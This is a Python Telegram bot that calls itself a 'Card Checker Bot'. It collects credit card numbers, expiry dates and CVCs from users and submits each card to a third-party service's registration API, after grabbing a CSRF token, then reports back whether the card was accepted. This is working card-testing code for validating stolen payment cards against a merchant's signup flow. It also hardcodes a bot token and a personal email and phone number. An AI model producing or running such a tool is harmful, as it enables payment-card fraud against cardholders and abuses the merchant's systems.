import telebot
import requests
import urllib.parse

BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
bot = telebot.TeleBot(BOT_TOKEN)

# Fixed email, phone, and zip code as requested
FIXED_EMAIL = "peshangsalam2001@gmail.com"
FIXED_PHONE = "+13144740467"
FIXED_ZIP = "BA3 HAL"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 Welcome to Card Checker Bot\n"
        "Please enter your credit card details in the format:\n"
        "CardNumber|ExpMonth|ExpYear|CVC\n"
        "Example:\n4242424242424242|10|28|123"
    )

@bot.message_handler(func=lambda m: '|' in m.text)
def card_handler(message):
    try:
        card_number, exp_month, exp_year, cvc = map(str.strip, message.text.split('|'))

        with requests.Session() as session:
            # Step 1: Get CSRF cookie and session cookies
            csrf_resp = session.get(
                "https://api.pocketpa.com/sanctum/csrf-cookie",
                headers={
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )

            # Decode XSRF-TOKEN cookie value
            raw_token = session.cookies.get("XSRF-TOKEN", "")
            xsrf_token = urllib.parse.unquote(raw_token)

            # Prepare payload with fixed email, phone, zip code
            payload = {
                "name": "Telegram User",
                "email": FIXED_EMAIL,
                "phone": FIXED_PHONE,
                "country_code": "1",
                "password": "TempPass123!",
                "locale": "en",
                "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
                "zip_code": FIXED_ZIP,
                "card": {
                    "number": card_number.replace(" ", ""),
                    "exp_month": exp_month.zfill(2),
                    "exp_year": exp_year[-2:],  # last two digits of year
                    "cvc": cvc
                }
            }

            # Step 2: POST register with session cookies and XSRF header
            response = session.post(
                "https://api.pocketpa.com/api/register",
                json=payload,
                headers={
                    "x-xsrf-token": xsrf_token,
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "content-type": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )

            resp_json = response.json()
            # Send both status and full JSON response back to user
            status_msg = f"Status code: {response.status_code}\nResponse JSON:\n{resp_json}"
            bot.reply_to(message, status_msg)

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

bot.infinity_polling()